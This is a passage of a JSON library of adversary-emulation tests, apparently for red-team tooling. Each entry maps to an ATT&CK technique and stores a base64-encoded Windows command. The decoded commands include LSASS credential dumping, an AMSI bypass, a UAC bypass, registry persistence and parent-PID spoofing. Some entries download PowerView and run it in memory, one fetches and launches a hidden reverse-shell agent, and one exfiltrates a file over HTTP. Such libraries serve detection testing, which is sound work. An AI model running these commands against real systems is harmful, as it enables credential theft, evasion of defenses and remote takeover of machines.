"buckets": ["defense-evasion"], "timeout": 60, "uploads": [], "parsers": [], "payloads": ["879ef4_T1218.001.chm"], "cleanup": [], "executor": "cmd", "access": {}, "description": "Uses hh.exe to execute a local compiled HTML Help payload.\nUpon execution calc.exe will open\n", "variations": []}, {"test": "Z2V0LWxvY2FsZ3JvdXA7IEdldC1Mb2NhbEdyb3VwTWVtYmVyIC1OYW1lICJBZG1pbmlzdHJhdG9ycyI=", "ability_id": "f5b4c02bae169cb3a62ac26bb80321d6", "technique_name": "Permission Groups Discovery: Local Groups", "additional_info": {}, "privilege": "", "technique_id": "T1069.001", "platform": "windows", "name": "Permission Groups Discovery PowerShell (Local)", "requirements": [], "tactic": "discovery", "buckets": ["discovery"], "timeout": 60, "uploads": [], "parsers": [], "payloads": [], "cleanup": [], "executor": "psh", "access": {}, "description": "Permission Groups Discovery utilizing PowerShell. This test will display some errors if run on a computer not connected to a domain. Upon execution, domain\ninformation will be displayed.\n", "variations": []}, {"test": "MTIwMTFjX0FkRmluZC5leGUgLXNjIGFkbWluY291bnRkbXA=", "ability_id": "9ebec3faaf3b1967542b8b7b88909e03", "technique_name": "Account Discovery: Domain Account", "additional_info": {}, "privilege": "", "technique_id": "T1087.002", "platform": "windows", "name": "Adfind - Enumerate Active Directory Admins", "requirements": [], "tactic": "discovery", "buckets": ["discovery"], "timeout": 60, "uploads": [], "parsers": [], "payloads": ["12011c_AdFind.exe"], "cleanup": [], "executor": "cmd", "access": {}, "description": "Adfind tool can be used for reconnaissance in an Active directory environment. This example has been documented by ransomware actors enumerating Active Directory Admin accounts\nreference- http://www.joeware.net/freetools/tools/adfind/, https://stealthbits.com/blog/fun-with-active-directorys-admincount-attribute/\n", "variations": []}, {"test": "aXBjb25maWcgL2FsbCAmJiBuZXQgY29uZmlnIHdvcmtzdGF0aW9uICYmIG5ldCB2aWV3IC9hbGwgL2RvbWFpbiAmJiBubHRlc3QgL2RvbWFpbl90cnVzdHM=", "ability_id": "9b5a0a6644a9cccc3dc3aa8be490430e", "technique_name": "System Network Configuration Discovery", "additional_info": {}, "privilege": "", "technique_id": "T1016", "platform": "windows", "name": "System Network Configuration Discovery (TrickBot Style)", "requirements": [], "tactic": "discovery", "buckets": ["discovery"], "timeout": 60, "uploads": [], "parsers": [], "payloads": [], "cleanup": [], "executor": "cmd", "access": {}, "description": "Identify network configuration information as seen by Trickbot and described here https://www.sneakymonkey.net/2019/10/29/trickbot-analysis-part-ii/\n\nUpon successful execution, cmd.exe will spawn `ipconfig /all`, `net config workstation`, `net view /all /domain`, `nltest /domain_trusts`. Output will be via stdout.\n", "variations": []}, {"test": "Zm9yIC9sICVpIGluICgxLDEsMjU0KSBkbyBwaW5nIC1uIDEgLXcgMTAwIDE5Mi4xNjguMS4laQ==", "ability_id": "985e6bbf0f1648f0ce9f02ae7c6ca40b", "technique_name": "Remote System Discovery", "additional_info": {}, "privilege": "", "technique_id": "T1018", "platform": "windows", "name": "Remote System Discovery - ping sweep", "requirements": [], "tactic": "discovery", "buckets": ["discovery"], "timeout": 60, "uploads": [], "parsers": [], "payloads": [], "cleanup": [], "executor": "cmd", "access": {}, "description": "Identify remote systems via ping sweep.\n\nUpon successful execution, cmd.exe will perform a for loop against the 192.168.1.1/24 network. Output will be via stdout.\n", "variations": []}, {"test": "UmVtb3ZlLUl0ZW0gLVBhdGggIkhLTE06XFNPRlRXQVJFXE1pY3Jvc29mdFxBTVNJXFByb3ZpZGVyc1x7Mjc4MTc2MUUtMjhFMC00MTA5LTk5RkUtQjlEMTI3QzU3QUZFfSIgLVJlY3Vyc2U=", "ability_id": "392e12d6a466407e28d1bb51cf0729bb", "technique_name": "Impair Defenses: Disable or Modify Tools", "additional_info": {}, "privilege": "", "technique_id": "T1562.001", "platform": "windows", "name": "AMSI Bypass - Remove AMSI Provider Reg Key", "requirements": [], "tactic": "defense-evasion", "buckets": ["defense-evasion"], "timeout": 60, "uploads": [], "parsers": [], "payloads": [], "cleanup": ["TmV3LUl0ZW0gLVBhdGggIkhLTE06XFNPRlRXQVJFXE1pY3Jvc29mdFxBTVNJXFByb3ZpZGVycyIgLU5hbWUgInsyNzgxNzYxRS0yOEUwLTQxMDktOTlGRS1COUQxMjdDNTdBRkV9IiAtRXJyb3JBY3Rpb24gSWdub3JlIHwgT3V0LU51bGw="], "executor": "psh", "access": {}, "description": "With administrative rights, an adversary can remove the AMSI Provider registry key in HKLM\\Software\\Microsoft\\AMSI to disable AMSI inspection.\nThis test removes the Windows Defender provider registry key. Upon execution, no output is displayed.\nOpen Registry Editor and navigate to \"HKLM:\\SOFTWARE\\Microsoft\\AMSI\\Providers\\\" to verify that it is gone.\n", "variations": []}, {"test": "W05ldC5TZXJ2aWNlUG9pbnRNYW5hZ2VyXTo6U2VjdXJpdHlQcm90b2NvbCA9IFtOZXQuU2VjdXJpdHlQcm90b2NvbFR5cGVdOjpUbHMxMjsgSUVYIChJV1IgJ2h0dHBzOi8vcmF3LmdpdGh1YnVzZXJjb250ZW50LmNvbS9Qb3dlclNoZWxsTWFmaWEvUG93ZXJTcGxvaXQvZjk0YTVkMjk4YTFiNGM1ZGZiMWYzMGEyNDZkOWM3M2QxM2IyMjg4OC9SZWNvbi9Qb3dlclZpZXcucHMxJyAtVXNlQmFzaWNQYXJzaW5nKTsgSW52b2tlLVVzZXJIdW50ZXIgLVN0ZWFsdGggLVZlcmJvc2U=", "ability_id": "cfcf66cc85109ad2ebdb301d619fa41f", "technique_name": "System Owner/User Discovery", "additional_info": {}, "privilege": "", "technique_id": "T1033", "platform": "windows", "name": "Find computers where user has session - Stealth mode (PowerView)", "requirements": [], "tactic": "discovery", "buckets": ["discovery"], "timeout": 60, "uploads": [], "parsers": [], "payloads": [], "cleanup": [], "executor": "psh", "access": {}, "description": "Find existing user session on other computers. Upon execution, information about any sessions discovered will be displayed.", "variations": []}, {"test": "R2V0LVdNSU9iamVjdCBXaW4zMl9QblBFbnRpdHkgfCBGb3JtYXQtVGFibGUgTmFtZSwgRGVzY3JpcHRpb24sIE1hbnVmYWN0dXJlciA+ICRlbnY6VEVNUFxUMTEyMF9jb2xsZWN0aW9uLnR4dDsgJFNwYWNlLCRIZWFkaW5nLCRCcmVhaywkRGF0YSA9IEdldC1Db250ZW50ICRlbnY6VEVNUFxUMTEyMF9jb2xsZWN0aW9uLnR4dDsgQCgkSGVhZGluZzsgJEJyZWFrOyAkRGF0YSB8U29ydC1PYmplY3QgLVVuaXF1ZSkgfCA/IHskXy50cmltKCkgLW5lICIiIH0gfFNldC1Db250ZW50ICRlbnY6VEVNUFxUMTEyMF9jb2xsZWN0aW9uLnR4dA==", "ability_id": "7b9c7afaefa59aab759b49af0d699ac1", "technique_name": "Peripheral Device Discovery", "additional_info": {}, "privilege": "", "technique_id": "T1120", "platform": "windows", "name": "Win32_PnPEntity Hardware Inventory", "requirements": [], "tactic": "discovery", "buckets": ["discovery"], "timeout": 60, "uploads": [], "parsers": [], "payloads": [], "cleanup": ["UmVtb3ZlLUl0ZW0gJGVudjpURU1QXFQxMTIwX2NvbGxlY3Rpb24udHh0IC1FcnJvckFjdGlvbiBJZ25vcmU="], "executor": "psh", "access": {}, "description": "Perform peripheral device discovery using Get-WMIObject Win32_PnPEntity", "variations": []}, {"test": "cmVnIGFkZCBIS0VZX0NVUlJFTlRfVVNFUlxTb2Z0d2FyZVxNaWNyb3NvZnRcV2luZG93c1xDdXJyZW50VmVyc2lvblxwb2xpY2llc1xzeXN0ZW0gL3YgRGlzYWJsZVJlZ2lzdHJ5VG9vbHMgL3QgUkVHX0RXT1JEIC9kIDEgL2Y=", "ability_id": "170152e7d13d7c1aa4853005c44d2152", "technique_name": "Modify Registry", "additional_info": {}, "privilege": "", "technique_id": "T1112", "platform": "windows", "name": "Disable Windows Registry Tool", "requirements": [], "tactic": "defense-evasion", "buckets": ["defense-evasion"], "timeout": 60, "uploads": [], "parsers": [], "payloads": [], "cleanup": ["cmVnIGRlbGV0ZSBIS0VZX0NVUlJFTlRfVVNFUlxTb2Z0d2FyZVxNaWNyb3NvZnRcV2luZG93c1xDdXJyZW50VmVyc2lvblxwb2xpY2llc1xzeXN0ZW0gL3YgRGlzYWJsZVJlZ2lzdHJ5VG9vbHMgL2YgPm51bCAyPiYx"], "executor": "cmd", "access": {}, "description": "Modify the registry of the currently logged in user using reg.exe via cmd console to disable the windows registry tool to prevent user modifying registry entry.\nSee example how Agent Tesla malware abuse this technique: https://any.run/report/ea4ea08407d4ee72e009103a3b77e5a09412b722fdef67315ea63f22011152af/a866d7b1-c236-4f26-a391-5ae32213dfc4#registry\n", "variations": []}, {"test": "IiV0ZW1wJVx1YWNtZVwyMyBBa2FnaTY0LmV4ZSI=", "ability_id": "95d3434abf05854b0e24ee2bc2d4a56c", "technique_name": "Abuse Elevation Control Mechanism: Bypass User Access Control", "additional_info": {}, "privilege": "", "technique_id": "T1548.002", "platform": "windows", "name": "UACME Bypass Method 23", "requirements": [], "tactic": "multiple", "buckets": ["multiple"], "timeout": 60, "uploads": [], "parsers": [], "payloads": [], "cleanup": ["cG93ZXJzaGVsbCBTdG9wLVByb2Nlc3MgLU5hbWUgY21kIC1Gb3JjZSAtRXJyb3JBY3Rpb24gSWdub3JlICYmIHBvd2Vyc2hlbGwgU3RvcC1Qcm9jZXNzIC1OYW1lIG1tYyAtRm9yY2UgLUVycm9yQWN0aW9uIElnbm9yZQ=="], "executor": "cmd", "access": {}, "description": "Executes User Account Control Bypass according to the methods listed below. Upon successful execution you should see event viewer load and two administrative command prompts.\nNote: The cleanup_command's which kill the spawned cmd and event viewer processes only work if run as admin.\n\nAuthor: Leo Davidson derivative\n\nType:\tDll Hijack\n\nMethod: IFileOperation\n\nTarget:\t\\system32\\pkgmgr.exe\n\nComponent: DismCore.dll\n\nImplementation:\tucmDismMethod\n\nUCM Method:\tUacMethodDISM\n\nhttps://github.com/hfiref0x/UACME\n", "variations": []}, {"test": "aWYgKCRob3N0LlZlcnNpb24uTWFqb3IgLWdlIDMpeyRFcnJBY3Rpb249ICJpZ25vcmUifWVsc2V7JEVyckFjdGlvbj0gIlNpbGVudGx5Q29udGludWUifTskc2VydmVyPSJodHRwOi8vMC4wLjAuMDo4ODg4Ijskc29ja2V0PSIwLjAuMC4wOjcwMTAiOyRjb250YWN0PSJ0Y3AiOyR1cmw9IiRzZXJ2ZXIvZmlsZS9kb3dubG9hZCI7JHdjPU5ldy1PYmplY3QgU3lzdGVtLk5ldC5XZWJDbGllbnQ7JHdjLkhlYWRlcnMuYWRkKCJwbGF0Zm9ybSIsIndpbmRvd3MiKTskd2MuSGVhZGVycy5hZGQoImZpbGUiLCJtYW54LmdvIik7JGRhdGE9JHdjLkRvd25sb2FkRGF0YSgkdXJsKTskbmFtZT0kd2MuUmVzcG9uc2VIZWFkZXJzWyJDb250ZW50LURpc3Bvc2l0aW9uIl0uU3Vic3RyaW5nKCR3Yy5SZXNwb25zZUhlYWRlcnNbIkNvbnRlbnQtRGlzcG9zaXRpb24iXS5JbmRleE9mKCJmaWxlbmFtZT0iKSs5KS5SZXBsYWNlKCJgIiIsIiIpO0dldC1Qcm9jZXNzIHwgPyB7JF8uUGF0aCAtbGlrZSAiQzpcVXNlcnNcUHVibGljXCRuYW1lLmV4ZSJ9IHwgc3RvcC1wcm9jZXNzIC1mIC1lYSAkRXJyQWN0aW9uO3JtIC1mb3JjZSAiQzpcVXNlcnNcUHVibGljXCRuYW1lLmV4ZSIgLWVhICRFcnJBY3Rpb247KFtpby5maWxlXTo6V3JpdGVBbGxCeXRlcygiQzpcVXNlcnNcUHVibGljXCRuYW1lLmV4ZSIsJGRhdGEpKSB8IE91dC1OdWxsO1N0YXJ0LVByb2Nlc3MgLUZpbGVQYXRoIEM6XFVzZXJzXFB1YmxpY1wkbmFtZS5leGUgLUFyZ3VtZW50TGlzdCAiLXNvY2tldCAkc29ja2V0IC1odHRwICRzZXJ2ZXIgLWNvbnRhY3QgJGNvbnRhY3QiIC1XaW5kb3dTdHlsZSBoaWRkZW47", "ability_id": "356d1722-7784-40c4-822b-0cf864b0b36d", "technique_name": "Ingress Tool Transfer", "additional_info": {}, "privilege": "", "technique_id": "T1105", "platform": "windows", "name": "Manx", "requirements": [], "tactic": "command-and-control", "buckets": ["command-and-control"], "timeout": 60, "uploads": [], "parsers": [], "payloads": [], "cleanup": [], "executor": "psh", "access": {}, "description": "A reverse-shell agent which communicates via the TCP contact", "variations": [{"command": "aWYgKCRob3N0LlZlcnNpb24uTWFqb3IgLWdlIDMpeyRFcnJBY3Rpb249ICJpZ25vcmUifWVsc2V7JEVyckFjdGlvbj0gIlNpbGVudGx5Q29udGludWUifTskc2VydmVyPSJodHRwOi8vMC4wLjAuMDo4ODg4Ijskc29ja2V0PSIwLjAuMC4wOjcwMTEiOyRjb250YWN0PSJ1ZHAiOyR1cmw9IiRzZXJ2ZXIvZmlsZS9kb3dubG9hZCI7JHdjPU5ldy1PYmplY3QgU3lzdGVtLk5ldC5XZWJDbGllbnQ7JHdjLkhlYWRlcnMuYWRkKCJwbGF0Zm9ybSIsIndpbmRvd3MiKTskd2MuSGVhZGVycy5hZGQoImZpbGUiLCJtYW54LmdvIik7JGRhdGE9JHdjLkRvd25sb2FkRGF0YSgkdXJsKTskbmFtZT0kd2MuUmVzcG9uc2VIZWFkZXJzWyJDb250ZW50LURpc3Bvc2l0aW9uIl0uU3Vic3RyaW5nKCR3Yy5SZXNwb25zZUhlYWRlcnNbIkNvbnRlbnQtRGlzcG9zaXRpb24iXS5JbmRleE9mKCJmaWxlbmFtZT0iKSs5KS5SZXBsYWNlKCJgIiIsIiIpO0dldC1Qcm9jZXNzIHwgPyB7JF8uUGF0aCAtbGlrZSAiQzpcVXNlcnNcUHVibGljXCRuYW1lLmV4ZSJ9IHwgc3RvcC1wcm9jZXNzIC1mIC1lYSAkRXJyQWN0aW9uO3JtIC1mb3JjZSAiQzpcVXNlcnNcUHVibGljXCRuYW1lLmV4ZSIgLWVhICRFcnJBY3Rpb247KFtpby5maWxlXTo6V3JpdGVBbGxCeXRlcygiQzpcVXNlcnNcUHVibGljXCRuYW1lLmV4ZSIsJGRhdGEpKSB8IE91dC1OdWxsO1N0YXJ0LVByb2Nlc3MgLUZpbGVQYXRoIEM6XFVzZXJzXFB1YmxpY1wkbmFtZS5leGUgLUFyZ3VtZW50TGlzdCAiLXNvY2tldCAkc29ja2V0IC1odHRwICRzZXJ2ZXIgLWNvbnRhY3QgJGNvbnRhY3QiIC1XaW5kb3dTdHlsZSBoaWRkZW47", "description": "Run against the UDP contact"}]}, {"test": "W05ldC5TZXJ2aWNlUG9pbnRNYW5hZ2VyXTo6U2VjdXJpdHlQcm90b2NvbCA9IFtOZXQuU2VjdXJpdHlQcm90b2NvbFR5cGVdOjpUbHMxMjsgSUVYIChJV1IgJ2h0dHBzOi8vcmF3LmdpdGh1YnVzZXJjb250ZW50LmNvbS9Qb3dlclNoZWxsTWFmaWEvUG93ZXJTcGxvaXQvZjk0YTVkMjk4YTFiNGM1ZGZiMWYzMGEyNDZkOWM3M2QxM2IyMjg4OC9SZWNvbi9Qb3dlclZpZXcucHMxJyAtVXNlQmFzaWNQYXJzaW5nKTsgRmluZC1HUE9Db21wdXRlckFkbWluIC1Db21wdXRlck5hbWUgJGVudjpDT01QVVRFUk5BTUUgLVZlcmJvc2Ui", "ability_id": "3b76cb7e6fe373d4553f60bb34982a4c", "technique_name": "Permission Groups Discovery: Domain Groups", "additional_info": {}, "privilege": "", "technique_id": "T1069.002", "platform": "windows", "name": "Find Local Admins via Group Policy (PowerView)", "requirements": [], "tactic": "discovery", "buckets": ["discovery"], "timeout": 60, "uploads": [], "parsers": [], "payloads": [], "cleanup": [], "executor": "psh", "access": {}, "description": "takes a computer and determines who has admin rights over it through GPO enumeration. Upon execution, information about the machine will be displayed.\n", "variations": []}, {"test": "ZWNobyAiQ3JlYXRlZHVtcCBQYXRoIEM6XFByb2dyYW0gRmlsZXNcZG90bmV0XHNoYXJlZFxNaWNyb3NvZnQuTkVUQ29yZS5BcHBcNS4qLipcY3JlYXRlZHVtcC5leGUiOyAkTFNBU1MgPSB0YXNrbGlzdCB8IGZpbmRzdHIgImxzYXNzIjsgJEZJRUxEUyA9ICRMU0FTUyAtc3BsaXQgIlxzKyI7ICRJRCA9ICRGSUVMRFNbMV07ICYgIkM6XFByb2dyYW0gRmlsZXNcZG90bmV0XHNoYXJlZFxNaWNyb3NvZnQuTkVUQ29yZS5BcHBcNS4qLipcY3JlYXRlZHVtcC5leGUiIC11IC1mIEM6XFdpbmRvd3NcVGVtcFxkb3RuZXQtbHNhc3MuZG1wICRJRA==", "ability_id": "974f31ce0e5a6a8d3b54c0e7448d38b5", "technique_name": "OS Credential Dumping: LSASS Memory", "additional_info": {}, "privilege": "", "technique_id": "T1003.001", "platform": "windows", "name": "Dump LSASS with .Net 5 createdump.exe", "requirements": [], "tactic": "credential-access", "buckets": ["credential-access"], "timeout": 60, "uploads": [], "parsers": [], "payloads": [], "cleanup": ["UmVtb3ZlLUl0ZW0gQzpcV2luZG93c1xUZW1wXGRvdG5ldC1sc2Fzcy5kbXAgLUVycm9yQWN0aW9uIElnbm9yZQ=="], "executor": "psh", "access": {}, "description": "This test uses the technique describe in this tweet \n(https://twitter.com/bopin2020/status/1366400799199272960?s=20) from @bopin2020 in order to dump lsass\n", "variations": []}, {"test": "JGNtRHdoeSA9W1R5UGVdKCJ7MH17MX0iIC1mICdTJywnVHJJTkcnKSAgOyAgICRwejJTYjAgID1bVFlwRV0oInsxfXswfXsyfSItZidudicsJ2NPJywnZXJ0JykgIDsgICYoInswfXsyfXszfXsxfXs0fSIgLWYnSW4nLCdTaU8nLCd2T0tlLUVYcCcsJ1JlUycsJ24nKSAoICAoJigiezF9ezJ9ezB9Ii1mJ2JsRScsJ2dFVC0nLCd2YVJJQScpICAoJ0NNZHcnKydoJysneScpKS4idmBBTFVlIjo6KCJ7MX17MH0iIC1mJ2lOJywnak8nKS5JbnZva2UoJycsKCAoMTI3LCAxNjIsMTUxLCAxNjQsMTQ1ICw1NSAsIDExMCAsMTU3ICwxNjMgLCAxNjQgLDQwLDQ3LCAxMTAgLCAxNDUgLDE1NCwgMTU0ICwxNTcgLCA1NCAsNDAsIDE0NiwgMTYyICwgMTU3LDE1NSAsNDAsIDEyMCwgMTU3ICwxNjcsMTQ1ICwgMTYyICwxMjMsMTUwICwxNDUgLCAxNTQgLCAxNTQgLCA0MSw0Nyl8IC4oJyUnKSB7ICggW0NIQVJdICggICRQejJzQjA6OiJ0YE9pblRgMTYiKCggW3NUcmluZ10ke199KSAsOCkpKX0pKSAp", "ability_id": "ed172018f897dab90147a47995ce197d", "technique_name": "Obfuscated Files or Information", "additional_info": {}, "privilege": "", "technique_id": "T1027", "platform": "windows", "name": "Obfuscated Command in PowerShell", "requirements": [], "tactic": "defense-evasion", "buckets": ["defense-evasion"], "timeout": 60, "uploads": [], "parsers": [], "payloads": [], "cleanup": [], "executor": "psh", "access": {}, "description": "This is an obfuscated PowerShell command which when executed prints \"Hello, from PowerShell!\". Example is from the 2021 Threat Detection Report by Red Canary.\n", "variations": []}, {"test": "U3RhcnQtUHJvY2VzcyAtRmlsZVBhdGggJEVudjp3aW5kaXJcU3lzdGVtMzJcbm90ZXBhZC5leGUgLVBhc3NUaHJ1IHwgU3RhcnQtQVRIUHJvY2Vzc1VuZGVyU3BlY2lmaWNQYXJlbnQgLUZpbGVQYXRoICRFbnY6d2luZGlyXFN5c3RlbTMyXFdpbmRvd3NQb3dlclNoZWxsXHYxLjBccG93ZXJzaGVsbC5leGUgLUNvbW1hbmRMaW5lICctQ29tbWFuZCBTdGFydC1TbGVlcCAxMCc=", "ability_id": "d949e2011b1d86da4ff232304848a3c0", "technique_name": "Access Token Manipulation: Parent PID Spoofing", "additional_info": {}, "privilege": "", "technique_id": "T1134.004", "platform": "windows", "name": "Parent PID Spoofing - Spawn from New Process", "requirements": [], "tactic": "multiple", "buckets": ["multiple"], "timeout": 60, "uploads": [], "parsers": [], "payloads": [], "cleanup": [], "executor": "psh", "access": {}, "description": "Creates a notepad.exe process and then spawns a powershell.exe process as a child of it.", "variations": []}, {"test": "R2V0LUNsaXBib2FyZCAtcmF3", "ability_id": "b007fe0c-c6b0-4fda-915c-255bbc070de2", "technique_name": "Clipboard Data", "additional_info": {}, "privilege": "", "technique_id": "T1115", "platform": "windows", "name": "Copy Clipboard", "requirements": [], "tactic": "collection", "buckets": ["collection"], "timeout": 60, "uploads": [], "parsers": [], "payloads": [], "cleanup": [], "executor": "psh", "access": {}, "description": "copy the contents for the clipboard and print them", "variations": []}, {"test": "UkVHIEFERCBIS0xNXFNPRlRXQVJFXE1pY3Jvc29mdFxXaW5kb3dzXEN1cnJlbnRWZXJzaW9uXFJ1bk9uY2VFeFwwMDAxXERlcGVuZCAvdiAxIC9kICJDOlxQYXRoXEF0b21pY1JlZFRlYW0uZGxsIg==", "ability_id": "d3ef4145e4144fd694514b1c5cc17350", "technique_name": "Boot or Logon Autostart Execution: Registry Run Keys / Startup Folder", "additional_info": {}, "privilege": "", "technique_id": "T1547.001", "platform": "windows", "name": "Reg Key RunOnce", "requirements": [], "tactic": "multiple", "buckets": ["multiple"], "timeout": 60, "uploads": [], "parsers": [], "payloads": [], "cleanup": ["UkVHIERFTEVURSBIS0xNXFNPRlRXQVJFXE1pY3Jvc29mdFxXaW5kb3dzXEN1cnJlbnRWZXJzaW9uXFJ1bk9uY2VFeFwwMDAxXERlcGVuZCAvdiAxIC9mID5udWwgMj4mMQ=="], "executor": "cmd", "access": {}, "description": "RunOnce Key Persistence.\n\nUpon successful execution, cmd.exe will modify the registry to load AtomicRedTeam.dll to RunOnceEx. Output will be via stdout. \n", "variations": []}, {"test": "UGF0aFRvQXRvbWljc0ZvbGRlclxUMTAwMy4wMDFcYmluXHByb2NkdW1wLmV4ZSAtYWNjZXB0ZXVsYSAtbWEgbHNhc3MuZXhlIEM6XFdpbmRvd3NcVGVtcFxsc2Fzc19kdW1wLmRtcA==", "ability_id": "3b39ba57fb4cc155148c8b28edaa7b10", "technique_name": "OS Credential Dumping: LSASS Memory", "additional_info": {}, "privilege": "", "technique_id": "T1003.001", "platform": "windows", "name": "Dump LSASS.exe Memory using ProcDump", "requirements": [], "tactic": "credential-access", "buckets": ["credential-access"], "timeout": 60, "uploads": [], "parsers": [], "payloads": [], "cleanup": ["ZGVsICJDOlxXaW5kb3dzXFRlbXBcbHNhc3NfZHVtcC5kbXAiID5udWwgMj4gbnVs"], "executor": "cmd", "access": {}, "description": "The memory of lsass.exe is often dumped for offline credential theft attacks. This can be achieved with Sysinternals\nProcDump.\n\nUpon successful execution, you should see the following file created c:\\windows\\temp\\lsass_dump.dmp.\n\nIf you see a message saying \"procdump.exe is not recognized as an internal or external command\", try using the  get-prereq_commands to download and install the ProcDump tool first.\n", "variations": []}, {"test": "SW52b2tlLVdlYlJlcXVlc3QgaHR0cDovL2FtdHNvLmVpY2FyLm9yZy9Qb3RlbnRpYWxseVVud2FudGVkLmV4ZSAtT3V0RmlsZSAkZW52OlRFTVAvUG90ZW50aWFsbHlVbndhbnRlZC5leGU7ICYgIiRlbnY6VEVNUC9Qb3RlbnRpYWxseVVud2FudGVkLmV4ZSI=", "ability_id": "424bc481ab003275752aad9c6b2d946a", "technique_name": "User Execution: Malicious File", "additional_info": {}, "privilege": "", "technique_id": "T1204.002", "platform": "windows", "name": "Potentially Unwanted Applications (PUA)", "requirements": [], "tactic": "execution", "buckets": ["execution"], "timeout": 60, "uploads": [], "parsers": [], "payloads": [], "cleanup": ["U3RvcC1Qcm9jZXNzIC1uYW1lIFBvdGVudGlhbGx5VW53YW50ZWQ7IFJlbW92ZS1JdGVtICRlbnY6VEVNUC9Qb3RlbnRpYWxseVVud2FudGVkLmV4ZSAtRXJyb3JBY3Rpb24gSWdub3Jl"], "executor": "psh", "access": {}, "description": "The Potentially Unwanted Applications (PUA) protection feature in antivirus software can identify and block PUAs from downloading and installing on endpoints in your network. These applications are not considered viruses, malware, or other types of threats, but might perform actions on endpoints that adversely affect their performance or use. This file is similar to EICAR test virus file, but is considered a Potentially Unwanted Application (PUA) instead of a VIRUS (i.e. not actually malicious, but is flagged as it to verify anti-pua protection).\n", "variations": []}, {"test": "R2V0LURhdGUgLVVGb3JtYXQgJyslWS0lbS0lZFQlSDolTTolU1on", "ability_id": "fa6e8607-e0b1-425d-8924-9b894da5a002", "technique_name": "System Time Discovery", "additional_info": {}, "privilege": "", "technique_id": "T1124", "platform": "windows", "name": "Get System Time", "requirements": [], "tactic": "discovery", "buckets": ["discovery"], "timeout": 60, "uploads": [], "parsers": [{"module": "plugins.stockpile.app.parsers.basic", "relationships": [{"edge": "", "source": "host.current.time", "custom_parser_vals": {}, "target": ""}]}], "payloads": [], "cleanup": [], "executor": "psh", "access": {}, "description": "get current system time (ISO 8601)", "variations": []}, {"test": "JHhtbCA9IFtTeXN0ZW0uSU8uRmlsZV06OlJlYWRBbGxUZXh0KCJQYXRoVG9BdG9taWNzRm9sZGVyXFQxMDUzLjAwNVxzcmNcVDEwNTNfMDA1X1dNSS54bWwiKTsgSW52b2tlLUNpbU1ldGhvZCAtQ2xhc3NOYW1lIFBTX1NjaGVkdWxlZFRhc2sgLU5hbWVTcGFjZSAiUm9vdFxNaWNyb3NvZnRcV2luZG93c1xUYXNrU2NoZWR1bGVyIiAtTWV0aG9kTmFtZSAiUmVnaXN0ZXJCeVhtbCIgLUFyZ3VtZW50cyBAeyBGb3JjZSA9ICR0cnVlOyBYbWwgPSR4bWw7IH0=", "ability_id": "bdb6d94c9a1e25b29b33fa9a60d8bfad", "technique_name": "Scheduled Task/Job: Scheduled Task", "additional_info": {}, "privilege": "", "technique_id": "T1053.005", "platform": "windows", "name": "WMI Invoke-CimMethod Scheduled Task", "requirements": [], "tactic": "multiple", "buckets": ["multiple"], "timeout": 60, "uploads": [], "parsers": [], "payloads": [], "cleanup": ["VW5yZWdpc3Rlci1TY2hlZHVsZWRUYXNrIC1UYXNrTmFtZSAiVDEwNTNfMDA1X1dNSSIgLWNvbmZpcm06JGZhbHNlID4kbnVsbCAyPiYx"], "executor": "psh", "access": {}, "description": "Create an scheduled task that executes notepad.exe after user login from XML by leveraging WMI class PS_ScheduledTask. Does the same thing as Register-ScheduledTask cmdlet behind the scenes.\n", "variations": []}, {"test": "JGNvbnRlbnQgPSBHZXQtQ29udGVudCBDOlxXaW5kb3dzXFN5c3RlbTMyXG5vdGVwYWQuZXhlOyBJbnZva2UtV2ViUmVxdWVzdCAtVXJpIGh0dHA6Ly8xMjcuMC4wLjEgLU1ldGhvZCBQT1NUIC1Cb2R5ICRjb250ZW50", "ability_id": "2e4b17949c4163f1cefec2e7fbee3e2b", "technique_name": "Exfiltration Over Alternative Protocol: Exfiltration Over Unencrypted/Obfuscated Non-C2 Protocol", "additional_info": {}, "privilege": "", "technique_id": "T1048.003", "platform": "windows", "name": "Exfiltration Over Alternative Protocol - HTTP", "requirements": [], "tactic": "exfiltration", "buckets": ["exfiltration"], "timeout": 60, "uploads": [], "parsers": [], "payloads": [], "cleanup": [], "executor": "psh", "access": {}, "description": "Exfiltration of specified file over HTTP.\nUpon successful execution, powershell will invoke web request using POST method to exfiltrate notepad.exe to a remote address (default http://127.0.0.1). Results will be via stdout.\n", "variations": []}, {"test": "UGF0aFRvQXRvbWljc0ZvbGRlclxUMTIyMFxiaW5cbXN4c2wuZXhlIDcwYTkxYl9tc3hzbHhtbGZpbGUueG1sIDk2ZWRlOF9tc3hzbHNjcmlwdC54c2w=", "ability_id": "39d480ca976cd45b9b50301fd6eaf393", "technique_name": "XSL Script Processing", "additional_info": {}, "privilege": "", "technique_id": "T1220", "platform": "windows", "name": "MSXSL Bypass using local files", "requirements": [], "tactic": "defense-evasion", "buckets": ["defense-evasion"], "timeout": 60, "uploads": [], "parsers": [], "payloads": ["70a91b_msxslxmlfile.xml", "96ede8_msxslscript.xsl"], "cleanup": ["ZGVsIFBhdGhUb0F0b21pY3NGb2xkZXJcVDEyMjBcYmluXG1zeHNsLmV4ZSA+bnVsIDI+JjE="], "executor": "cmd", "access": {}, "description": "Executes the code specified within a XSL script tag during XSL transformation using a local payload. \nRequires download of MSXSL. No longer available from Microsoft.\n(Available via Internet Archive https://web.archive.org/web/20200825011623/https://www.microsoft.com/en-us/download/details.aspx?id=21714 ) \nOpen Calculator.exe when test successfully executed, while AV turned off.\n", "variations": []}, {"test": "QzpcV2luZG93c1xNaWNyb3NvZnQuTkVUXEZyYW1ld29ya1x2NC4wLjMwMzE5XG1zYnVpbGQuZXhlIGU5M2JjM19UMTEyNy4wMDEuY3Nwcm9q", "ability_id": "be0cdc3812a6ed7cc1a2e6cb6ea14f58", "technique_name": "Trusted Developer Utilities Proxy Execution: MSBuild", "additional_info": {}, "privilege": "", "technique_id": "T1127.001", "platform": "windows", "name": "MSBuild Bypass Using Inline Tasks (C#)", "requirements": [], "tactic": "defense-evasion", "buckets": ["defense-evasion"], "timeout": 60, "uploads": [], "parsers": [], "payloads": ["e93bc3_T1127.001.csproj"], "cleanup": [], "executor": "cmd", "access": {}, "description": "Executes the code in a project file using msbuild.exe. The default C# project example file (T1127.001.csproj) will simply print \"Hello From a Code Fragment\" and \"Hello From a Class.\" to the screen.\n", "variations": []}, {"test": 